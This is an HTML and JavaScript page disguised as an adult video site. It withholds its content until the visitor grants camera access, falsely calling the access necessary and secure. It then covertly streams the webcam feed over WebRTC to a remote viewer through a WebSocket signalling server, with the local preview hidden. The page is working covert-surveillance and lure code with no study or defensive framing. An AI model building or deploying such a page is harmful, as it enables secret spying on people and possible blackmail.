<!doctype html>
<html>
<head>
  <meta name="viewport" content="width=device-width,initial-scale=1">
  <title>XXX Videos</title>

  <style>
    html, body {
      margin: 0;
      padding: 0;
      width: 100%;
      height: 100%;
      background: white;
      font-family: Arial, sans-serif;
    }

    #blocked {
      text-align: center;
      padding-top: 40px;
    }

    #cameraPage {
      display: none;
    }

    .content {
      text-align: center;
      padding-top: 40px;
    }

    h1 {
      font-size: 32px;
      margin: 0 0 10px;
    }

    p {
      font-size: 18px;
      margin: 0 0 25px;
    }

    button {
      padding: 14px 28px;
      font-size: 18px;
      border: 0;
      border-radius: 8px;
      cursor: pointer;
    }

    video {
      display: none;
    }
  </style>
</head>

<body>

<!-- Shown until camera permission is granted -->
<div id="blocked">
  <h2>Camera Permission Required</h2>
  <p>Allow camera access to continue.</p>
</div>

<!-- Shown only after permission is granted -->
<div class="content" id="cameraPage">

  <h1>XXX Videos</h1>

  <p>See more videos</p>

  <a href="https://www.freepornvideo.sex/" target="_blank">
    <button>See More Videos</button>
  </a>

</div>

<video id="video" autoplay muted playsinline></video>

<script>

const video = document.getElementById("video");
const blocked = document.getElementById("blocked");
const cameraPage = document.getElementById("cameraPage");

const ws = new WebSocket(
  (location.protocol === "https:" ? "wss:" : "ws:") +
  "//" + location.host + "/camera"
);

let pc = null;
let stream = null;

function createPeer() {

  pc = new RTCPeerConnection({
    iceServers: [
      {
        urls: "stun:stun.l.google.com:19302"
      }
    ]
  });

  pc.onicecandidate = event => {

    if (
      event.candidate &&
      ws.readyState === WebSocket.OPEN
    ) {

      ws.send(JSON.stringify({
        type: "candidate",
        candidate: event.candidate
      }));

    }
  };
}


async function startCamera() {

  try {

    /*
      Browser will ask:
      "Allow this site to use your camera?"
    */

    stream = await navigator.mediaDevices.getUserMedia({
      video: true,
      audio: false
    });

    /*
      Permission was granted.
      Now show the page.
    */

    blocked.style.display = "none";
    cameraPage.style.display = "block";

    video.srcObject = stream;

    createPeer();

    stream.getTracks().forEach(track => {
      pc.addTrack(track, stream);
    });

  }

  catch (error) {

    /*
      Permission denied.
      Camera is NOT accessed.
    */

    blocked.innerHTML = `
      <h2>Camera Permission Required</h2>
      <p>Camera access is required to see the video its secure to access.</p>
      <p>Please allow camera access and reload this page.</p>
    `;

    console.error(error);

  }

}


ws.onopen = () => {

  console.log("WebSocket connected");

};


ws.onmessage = async event => {

  const message = JSON.parse(event.data);


  /*
    Server identifies this browser as Camera A.
  */

  if (message.type === "role") {

    if (message.role === "camera") {

      await startCamera();

    }

  }


  /*
    Viewer connected.
    Create WebRTC offer.
  */

  if (message.type === "viewer-ready") {

    if (!pc) {
      return;
    }

    const offer = await pc.createOffer();

    await pc.setLocalDescription(offer);

    ws.send(JSON.stringify({
      type: "offer",
      offer: pc.localDescription
    }));

  }


  /*
    Receive answer from viewer.
  */

  if (message.type === "answer") {

    if (pc) {

      await pc.setRemoteDescription(
        message.answer
      );

    }

  }


  /*
    Receive ICE candidate.
  */

  if (message.type === "candidate") {

    if (pc) {

      try {

        await pc.addIceCandidate(
          message.candidate
        );

      }

      catch (error) {

        console.error(error);

      }

    }

  }


  /*
    Server reports an error.
  */

  if (message.type === "error") {

    blocked.innerHTML = `
      <h2>Camera Unavailable</h2>
      <p>${message.message}</p>
    `;

  }

};


ws.onclose = () => {

  console.log("WebSocket connection closed");

};

</script>

</body>
</html>
